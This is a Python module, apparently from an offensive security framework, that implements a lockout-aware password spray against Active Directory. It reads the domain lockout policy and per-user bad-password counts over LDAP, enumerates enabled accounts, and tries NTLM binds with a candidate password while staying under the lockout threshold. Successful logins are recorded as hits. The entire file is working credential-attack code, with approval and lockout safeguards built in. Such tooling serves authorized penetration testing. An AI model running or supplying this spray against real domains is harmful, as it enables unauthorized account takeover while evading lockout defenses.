"""Lockout-aware password spray.

Enumerates lockoutThreshold / lockoutObservationWindow and per-user
badPwdCount / badPasswordTime to keep every account safely below the
threshold. Emits per-attempt and per-hit records.
"""

from __future__ import annotations

import json
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from ldap3 import SUBTREE, Connection, Server
from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import ldap_filter_value
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import (
    ApprovalPolicy,
    RiskLevel,
    RollbackClass,
    SafetyProfile,
    register_capability,
)
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def _filetime_to_dt(ft: int) -> datetime | None:
    if not ft or ft <= 0:
        return None
    return datetime.fromtimestamp(ft / 10_000_000 - 11644473600, tz=UTC)


def _read_lockout_policy(conn: Any, base_dn: str) -> dict[str, int]:
    conn.search(
        base_dn,
        "(objectClass=domain)",
        search_scope=SUBTREE,
        attributes=["lockoutThreshold", "lockoutObservationWindow", "minPwdLength"],
    )
    policy = {"lockout_threshold": 0, "observation_window_seconds": 0}
    if conn.entries:
        entry = conn.entries[0]
        if entry.lockoutThreshold:
            policy["lockout_threshold"] = int(entry.lockoutThreshold.value)
        if entry.lockoutObservationWindow:
            raw = int(entry.lockoutObservationWindow.value)
            policy["observation_window_seconds"] = int(abs(raw) / 10_000_000)
    return policy


def _load_users(source: str | None, conn: Any, base_dn: str, filter_expr: str | None) -> list[str]:
    path = Path(source).expanduser() if source else None
    if path and path.is_file():
        return [
            line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()
        ]
    conn.search(
        base_dn,
        filter_expr
        or "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "badPwdCount", "badPasswordTime"],
    )
    users: list[str] = []
    for entry in conn.entries:
        sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
        if sam:
            users.append(sam)
    return users


def _account_lockout_state(conn: Any, base_dn: str, sam: str) -> tuple[int, datetime | None]:
    conn.search(
        base_dn,
        f"(sAMAccountName={ldap_filter_value(sam)})",
        search_scope=SUBTREE,
        attributes=["badPwdCount", "badPasswordTime"],
    )
    if not conn.entries:
        return 0, None
    entry = conn.entries[0]
    bad = int(entry.badPwdCount.value) if entry.badPwdCount else 0
    ts = _filetime_to_dt(int(entry.badPasswordTime.value)) if entry.badPasswordTime else None
    return bad, ts


def _try_bind(target: Target, username: str, password: str, ldaps: bool) -> tuple[bool, str]:
    server = Server(target.dc_ip, use_ssl=ldaps, get_info=None)
    user_dn = f"{target.domain}\\{username}"
    try:
        conn = Connection(
            server, user=user_dn, password=password, authentication="NTLM", auto_bind=True
        )
        conn.unbind()
        return True, "ok"
    except Exception as exc:
        return False, str(exc)[:200]


@register_capability(
    id="password-spray",
    summary="Lockout-aware password spray against user accounts",
    category="credential-access",
    tags=("password-spray", "brute-force", "lockout"),
    safety=SafetyProfile(
        risk=RiskLevel.SIDE_EFFECT,
        approval=ApprovalPolicy.SCOPED_TOKEN,
        rollback=RollbackClass.NONE,
        network_side_effect=True,
        exposes_credentials=True,
    ),
)
class PasswordSpray:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        password = (
            kwargs.get("password_to_try") or kwargs.get("spray_password") or kwargs.get("value")
        )
        if not password:
            raise RuntimeError("Pass -P spray_password=<candidate> (or --value).")
        users_source = kwargs.get("users") or kwargs.get("userlist")
        user_filter = kwargs.get("user_filter")
        safety_margin = int(kwargs.get("safety_margin", 2))
        delay_seconds = float(kwargs.get("delay_seconds", 0.0))
        max_attempts = int(kwargs.get("max_attempts", 0))

        console.print(f"[bold]Password spray[/bold] → {target.domain} @ {target.dc_ip}")
        conn, base_dn, _ = ldap_connect(target)
        policy = _read_lockout_policy(conn, base_dn)
        console.print(
            f"Policy: threshold={policy['lockout_threshold']}  "
            f"window={policy['observation_window_seconds']}s"
        )
        users = _load_users(users_source, conn, base_dn, user_filter)
        if max_attempts and len(users) > max_attempts:
            users = users[:max_attempts]
        console.print(f"Users: {len(users)}")

        threshold = policy["lockout_threshold"]
        if threshold <= 0:
            conn.unbind()
            raise RuntimeError(
                "Password spray requires a verified non-zero lockoutThreshold; "
                "refusing to continue when lockout policy is unavailable or disabled."
            )
        attempts: list[dict[str, Any]] = []
        hits: list[dict[str, Any]] = []

        for sam in users:
            bad, _last_ts = _account_lockout_state(conn, base_dn, sam)
            safe_ceiling = threshold - safety_margin
            if threshold and bad >= safe_ceiling:
                attempts.append(
                    {
                        "sam": sam,
                        "skipped": "at_or_near_lockout",
                        "bad_pwd_count": bad,
                        "threshold": threshold,
                    }
                )
                console.print(f"  [yellow]skip[/yellow] {sam} bad={bad}/{threshold}")
                continue
            ok, note = _try_bind(target, sam, password, target.ldaps)
            record = {
                "sam": sam,
                "bad_pwd_count_pre": bad,
                "ok": ok,
                "note": note,
                "attempted_at": datetime.now(UTC).isoformat(),
            }
            attempts.append(record)
            if ok:
                hits.append({"sam": sam, "note": note})
                console.print(f"  [green]HIT[/green] {sam}")
                node = f"USER@{sam.upper()}@{target.domain.upper()}"
                graph.add_node(node, "User", sam=sam, spray_hit=True)
                graph.add_edge(node, node, "PasswordSprayHit")
            else:
                console.print(f"  [dim]miss[/dim] {sam}")
            if delay_seconds:
                time.sleep(delay_seconds)
        conn.unbind()

        result = {
            "domain": target.domain,
            "policy": policy,
            "attempts": attempts,
            "hits": hits,
            "hit_count": len(hits),
            "attempt_count": len(attempts),
        }
        out = session.path("spray.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "password-spray.complete",
            attempts=len(attempts),
            hits=len(hits),
            threshold=threshold,
        )
        console.print(f"[green]Done[/green]  attempts={len(attempts)}  hits={len(hits)}")
        console.print(f"Results → {out}")
        return result
